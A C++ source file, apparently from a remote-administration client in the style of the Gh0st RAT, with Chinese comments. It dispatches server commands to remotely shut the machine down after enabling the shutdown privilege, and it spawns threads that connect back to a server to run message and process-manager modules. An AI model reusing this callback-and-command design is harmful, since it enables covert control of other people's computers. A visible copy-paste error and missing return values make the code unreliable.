#include "pch.h"
#include "KernelManager.h"
#include"Common.h"
#include"dllmain.h"
#include"InstantMessageManager.h"
#include"SystemHelper.h"
#include"ProcessHelper.h"
#include"ProcessManager.h"
CKernelManager::CKernelManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	m_ThreadHandleCount=0;
	ZeroMemory(m_ThreadHandle, sizeof(HANDLE)*0x1000);
}
CKernelManager::~CKernelManager()
{

}

void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
		case CLIENT_GET_OUT_REQUIRE:
		{

			IsToken = CLIENT_GET_OUT_REPLY;

			m_IocpClient->OnSending((char*)&IsToken, 1);

			break;
		}
		case CLIENT_SHUT_DOWN_REQUIRE:
		{

			IsToken = CLIENT_SHUT_DOWN_REPLY;
			m_IocpClient->OnSending((char*)&IsToken, 1);
			Sleep(1);

			ZhEnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);     //TRUE打开
			ShutdownSystem();
			ZhEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);     //FALSE关闭
			break;
		}
		case CLIENT_REMOTE_MESSAGE_REQUIRE:
		{

			//启动一个线程
			m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)InstantMessageProcedure,                 //线程回调函数，如果定义为类成员函数要定义为静态，否则为全局
				NULL, 0, NULL);


			break;
		}
		case CLIENT_PROCESS_MANAGER_REQUIRE:
		{

			//启动一个线程
			m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
				NULL, 0, NULL);

			break;
		}
	}
}
DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData)
{
	//建立一个新的连接
	CIocpClient	IocpClient;   //新的链接

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))   //产生一个新的链接  while(接收数据 解压 等 )  m_Manger->HandiO
		return -1;
	CProcessManager	ProcessManager(&IocpClient);




	IocpClient.WaitingForEvent();  //一个事件等待阻塞,防止上面对象销毁
}

DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData)
{
	//建立一个新的连接
	CIocpClient	IocpClient;   //新的链接

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))   //产生一个新的链接  while(接收数据 解压 等 )  m_Manger->HandiO
		return -1;
	CProcessManager	ProcessManager(&IocpClient);




	IocpClient.WaitingForEvent();  //一个事件等待阻塞,防止上面对象销毁
}
